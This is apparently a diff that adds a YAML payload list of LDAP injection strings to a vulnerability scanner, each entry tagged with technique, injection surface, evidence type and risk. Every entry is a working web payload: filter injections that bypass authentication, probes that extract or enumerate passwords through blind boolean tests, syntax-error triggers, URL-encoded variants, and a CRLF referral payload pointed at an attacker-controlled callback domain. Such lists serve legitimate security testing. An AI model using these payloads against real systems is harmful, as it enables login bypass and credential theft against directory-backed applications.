@@ -1,0 +1,143 @@
+defaults:
+  vuln_type: ldap
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # LDAP filter injection — authentication bypass
+  # ============================================================
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "*)(uid=*))(|(uid=*"
+    notes: "LDAP wildcard filter injection. Closes filter, injects OR condition matching all users."
+    tags: [ldap, filter, wildcard, auth_bypass]
+
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "admin)(&)"
+    notes: "LDAP filter injection — close parenthesis + always-true AND filter."
+    tags: [ldap, filter, and, bypass]
+
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "*)(&"
+    notes: "LDAP injection — wildcard match with unclosed filter to trigger error or match-all."
+    tags: [ldap, filter, wildcard]
+
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "*)(|(password=*))"
+    notes: "LDAP filter injection — extract password attribute via OR condition."
+    tags: [ldap, filter, attribute_extraction]
+
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: status_diff
+    risk: 3
+    payload: "admin)(|(objectClass=*))"
+    notes: "LDAP filter injection — match any objectClass after closing the legitimate filter."
+    tags: [ldap, filter, objectclass]
+
+  - technique: ldap_filter_injection
+    injection_surface: form_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "*)(uid=*))(|(uid=*"
+    notes: "LDAP filter injection via form body (login form)."
+    tags: [ldap, filter, form, auth_bypass]
+
+  - technique: ldap_filter_injection
+    injection_surface: json_body
+    evidence_type: status_diff
+    risk: 3
+    payload: "*)(uid=*))(|(uid=*"
+    notes: "LDAP filter injection via JSON body (REST API)."
+    tags: [ldap, filter, json, auth_bypass]
+
+  # ============================================================
+  # LDAP blind boolean
+  # ============================================================
+  - technique: ldap_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "admin)(|(cn=a*))"
+    notes: "Blind LDAP boolean probe — true condition (cn starts with 'a'). Compare response to false."
+    tags: [ldap, blind, boolean, true]
+
+  - technique: ldap_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "admin)(|(cn=ZZZZZ*))"
+    notes: "Blind LDAP boolean probe — false condition (unlikely cn prefix). Compare to true probe."
+    tags: [ldap, blind, boolean, false]
+
+  - technique: ldap_blind_boolean
+    injection_surface: query
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "*)(&(uid=admin)(userPassword=a*))"
+    notes: "Blind LDAP password enumeration — check if password starts with 'a'."
+    tags: [ldap, blind, boolean, password_enum]
+
+  # ============================================================
+  # LDAP blind error
+  # ============================================================
+  - technique: ldap_blind_error
+    injection_surface: query
+    evidence_type: error
+    risk: 3
+    payload: "admin)((("
+    notes: "LDAP syntax error trigger — unbalanced parentheses cause LDAP server error."
+    tags: [ldap, error, syntax]
+
+  - technique: ldap_blind_error
+    injection_surface: query
+    evidence_type: error
+    risk: 3
+    payload: "\\00"
+    notes: "LDAP null byte injection — may cause LDAP protocol error."
+    tags: [ldap, error, null_byte]
+
+  # ============================================================
+  # URL-encoded variants
+  # ============================================================
+  - technique: ldap_filter_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: status_diff
+    risk: 3
+    payload: "%2a%29%28%75%69%64%3d%2a%29%29%28%7c%28%75%69%64%3d%2a"
+    notes: "URL-encoded LDAP wildcard filter injection."
+    tags: [ldap, filter, url_encoded]
+
+  - technique: ldap_filter_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: status_diff
+    risk: 3
+    payload: "%61%64%6d%69%6e%29%28%26%29"
+    notes: "URL-encoded admin)(&) LDAP injection."
+    tags: [ldap, filter, url_encoded]
+
+  # ============================================================
+  # OOB DNS confirmation
+  # ============================================================
+  - technique: ldap_filter_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "*)(objectClass=*))%0a%0dDN:COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "LDAP injection with CRLF attempting LDAP referral to attacker domain for OOB confirmation."
+    tags: [ldap, oob, dns, referral]
